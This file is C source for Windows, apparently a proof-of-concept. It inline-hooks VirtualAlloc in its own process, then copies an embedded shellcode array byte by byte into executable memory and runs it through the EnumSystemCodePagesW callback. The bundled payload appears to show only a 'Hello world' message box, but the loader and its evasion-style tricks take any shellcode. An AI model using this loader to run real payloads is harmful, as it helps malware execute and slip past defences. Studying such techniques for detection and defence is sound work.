#include <Windows.h>
#include <stdio.h>

unsigned char shellcode[] =
"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

FARPROC origVirtualAlloc = NULL;
char origVirtualAllocBytes[14] = { 0 };
SIZE_T bytesWritten = 0;
HANDLE hProcess = GetCurrentProcess();


// Define the hooked function
LPVOID __stdcall HookedVirtualAlloc(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flAllocationType,
	DWORD flProtect)
{
	printf("\r\n		===== Hi from HookedVirtualAlloc ===== \r\n\r\n");

	// restore original VirtualAlloc API
	BOOL restoreVirtualAlloc = WriteProcessMemory(hProcess, (LPVOID)origVirtualAlloc, origVirtualAllocBytes, sizeof(origVirtualAllocBytes), &bytesWritten);
	if (0 == restoreVirtualAlloc) {
		printf("[-] Failed restoring original VirtualAlloc\n");
		return FALSE;
	}

	return VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
}

int main() {

	SIZE_T readBytes;

	// Load the kernel32 libary to get the address of VirtualAlloc
	HMODULE k32lib = LoadLibraryW(L"kernel32.dll");
	if (k32lib == NULL) {
		printf("[-] Failed loading kernel32 library\n");
		return -1;
	}

	// Address of original VirtualAlloc
	origVirtualAlloc = GetProcAddress(k32lib, "VirtualAlloc");
	printf("[*] Address of original VirtualAlloc -> [ %p ]\n", origVirtualAlloc);

	FreeLibrary(k32lib);

	// Read the first 14 bytes from the address of VirtualAlloc
	BOOL rBytes = ReadProcessMemory(hProcess, origVirtualAlloc, origVirtualAllocBytes, 14, &readBytes);
	if (FALSE == rBytes) {
		printf("[-] Failed reading the first 8 bytes of VirtualAlloc\n");
		return -2;
	}

	// Reference the address of the hooked function 
	// so we can jump to it
	void* hookedVirtualAlloc = &HookedVirtualAlloc;
	printf("[*] Address of HookedVirtualAlloc -> [ %p ]\n", hookedVirtualAlloc);

	// 14 bytes for the patch 
	// https://ragestorm.net/blogs/?p=107
	// Patch is: <14 bytes> -> JMP [RIP+0]; <ADDR64>
	// \xFF\x25\x00\x00\x00\x00
	// \x00\x11\x22\x33\x44\x55\x66\x77 (<ADDR64>)
	char patch[14] = { 0 };
	printf("[*] Address of patch[] -> [ %p ]\n", (void*)patch);

	memcpy_s(patch, sizeof(patch), "\xff\x25", 2);
	memcpy_s(patch + 6, sizeof(patch), &hookedVirtualAlloc, 8);

	//printf("[!] (! After Patch !) Hit Enter ! \n");
	//getchar();

	BOOL patched = WriteProcessMemory(hProcess, (LPVOID)origVirtualAlloc, patch, sizeof(patch), &bytesWritten);
	if (0 == patched) {
		printf("[-] Failed patching VirtualAlloc\n");
		return -3;
	}

	printf("[+] Patched and hook applied !\n");

	CloseHandle(hProcess);

	LPVOID memory = VirtualAlloc(NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (NULL == memory) {
		printf("[-] Hooked VirtualAlloc failed allocating memory\n");
		return -4;
	}

	printf("[+] Allocated memory by hooked function -> [ %p ]\n", memory);

	// Move 1 byte at a time and execute :)
	for (int i = 0; i < sizeof(shellcode); i++) {
		SIZE_T mem = (SIZE_T)memory + i;
		RtlCopyMemory((LPVOID)mem, &shellcode[i], sizeof(shellcode[i]));
		Sleep(50);

	}

	//RtlMoveMemory(memory, shellcode, sizeof(shellcode));
	EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)memory, 0);

	return 0;
}